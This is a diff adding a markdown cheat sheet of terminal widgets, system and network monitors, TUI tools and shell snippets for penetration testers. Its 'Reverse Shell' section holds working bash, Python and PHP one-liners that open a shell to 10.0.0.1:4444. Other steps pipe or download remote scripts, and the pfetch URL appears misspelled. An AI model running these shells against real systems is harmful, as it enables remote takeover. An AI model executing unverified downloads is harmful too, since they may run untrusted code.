@@ -1,0 +1,277 @@
+# Custom Widgets & Tools Pentesters Love
+
+## Terminal Widgets
+
+### Fastfetch (Neofetch Alternative)
+```bash
+# Install
+git clone https://github.com/fastfetch-cli/fastfetch.git
+cd fastfetch && cmake -B build && cmake --build build
+# Run
+fastfetch
+```
+
+### Neofetch
+```bash
+apt install neofetch
+neofetch
+```
+
+### Screenfetch
+```bash
+apt install screenfetch
+screenfetch
+```
+
+### Pfetch
+```bash
+# Lightweight alternative
+curl -sL https://github.com/dylanarfff/pfetch/raw/master/pfetch -o /usr/local/bin/pfetch
+chmod +x /usr/local/bin/pfetch
+pfetch
+```
+
+## System Monitors
+
+### Bottles (for Windows tools)
+```bash
+flatpak install bottles
+```
+
+### Gtop (System monitor)
+```bash
+npm install -g gtop
+gtop
+```
+
+### Bottom (Rust alternative)
+```bash
+cargo install bottom
+btm
+```
+
+### Glances
+```bash
+pip install glances
+glances
+```
+
+## Network Monitors
+
+### EtherApe (GUI Network View)
+```bash
+apt install etherape
+etherape
+```
+
+### vnStat (Bandwidth)
+```bash
+apt install vnstat
+vnstat -l
+```
+
+### IPTraf
+```bash
+apt install iptraf-ng
+iptraf-ng
+```
+
+### Darkstat
+```bash
+apt install darkstat
+darkstat -i eth0
+```
+
+## Custom Bash Widgets
+
+### Network Status Widget
+```bash
+#!/bin/bash
+# ~/bin/net-widget.sh
+while true; do
+    clear
+    echo "📡 $(hostname -I)"
+    echo "🌐 $(curl -s ifconfig.me)"
+    echo "📊 $(vnstat -h | tail -1)"
+    sleep 5
+done
+```
+
+### Pentest Dashboard
+```bash
+#!/bin/bash
+# Dashboard
+echo "╔═══════════════════════════════════╗"
+echo "║   PENTEST DASHBOARD               ║"
+echo "╠═══════════════════════════════════╣"
+echo "║ $(date)"
+echo "║ IP: $(hostname -I | awk '{print $1}')"
+echo "║ User: $(whoami)"
+echo "║ Kernel: $(uname -r)"
+echo "╚═══════════════════════════════════╝"
+```
+
+## Handy One-Liners
+
+### Quick HTTP Server
+```bash
+python3 -m http.server 8000
+```
+
+### Quick SSH Server
+```bash
+service ssh start
+```
+
+### Transfer File
+```bash
+# Host
+python3 -m http.server 8000
+# Download
+curl http://IP:8000/file -o file
+
+# Or
+nc -lvp 1234 > file.txt
+nc IP 1234 < file.txt
+```
+
+### Reverse Shell
+```bash
+# Bash
+bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+
+# Python
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# PHP
+php -r '$s=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+## Useful TUI Tools
+
+### Ranger (File Manager)
+```bash
+apt install ranger
+ranger
+```
+
+### LazyDocker
+```bash
+curl -sL https://raw.githubusercontent.com/jesseduffield/lazydocker/master/scripts/install_update.sh | bash
+lazydocker
+```
+
+### LazyGit
+```bash
+apt install lazygit
+lazygit
+```
+
+### GitUI
+```bash
+cargo install gitui
+gitui
+```
+
+## GUI Tools on USB
+
+### Remmina (RDP/VNC)
+```bash
+apt install remmina
+remmina
+```
+
+### FileZilla (FTP)
+```bash
+apt install filezilla
+filezilla
+```
+
+### Wireshark
+```bash
+apt install wireshark
+wireshark
+```
+
+## Custom Scripts
+
+### Auto-Screenshot
+```bash
+#!/bin/bash
+# Screenshot with timestamp
+import -window root ~/screenshots/$(date +%Y%m%d_%H%M%S).png
+```
+
+### Quick Notes
+```bash
+#!/bin/bash
+# Quick note
+echo "$(date): $1" >> ~/notes/pentest-$(date +%Y%m%d).txt
+```
+
+### Wordlist Generator
+```bash
+# Combine wordlists
+cat /usr/share/wordlists/*.txt | sort -u > custom-wordlist.txt
+```
+
+## Theming Tools
+
+### PyWal (Wallpaper colors)
+```bash
+pip install pywal
+wal -i ~/wallpaper.jpg
+```
+
+### ColorLS (Colored ls)
+```bash
+gem install colorls
+colorls --dark
+```
+
+## Productivity Tools
+
+### TaskWarrior (Tasks)
+```bash
+apt install task
+task add "Nmap scan"
+task list
+```
+
+### Tldr (Simplified man)
+```bash
+pip install tldr
+tldr nmap
+```
+
+### Bat (Better cat)
+```bash
+apt install bat
+bat file.txt
+```
+
+### Exa (Better ls)
+```bash
+apt install exa
+exa -la
+```
+
+## Widgets for .bashrc/.zshrc
+
+```bash
+# PS1 with colors
+PS1='\[\e[1;32m\]\u@\h\[\e[0m\]:\[\e[1;34m\]\w\[\e[0m\]\$ '
+
+# Git branch in prompt
+parse_git_branch() {
+    git branch 2>/dev/null | grep '*' | sed 's/* //'
+}
+PS1="\u@\h:\w\[\033[33m\]\$(parse_git_branch)\[\033[0m\]\$ "
+
+# Aliases
+alias ll='ls -lah'
+alias la='ls -A'
+alias l='ls -CF'
+
+# Quick functions
+mkcd() { mkdir -p "$1" && cd "$1"; }
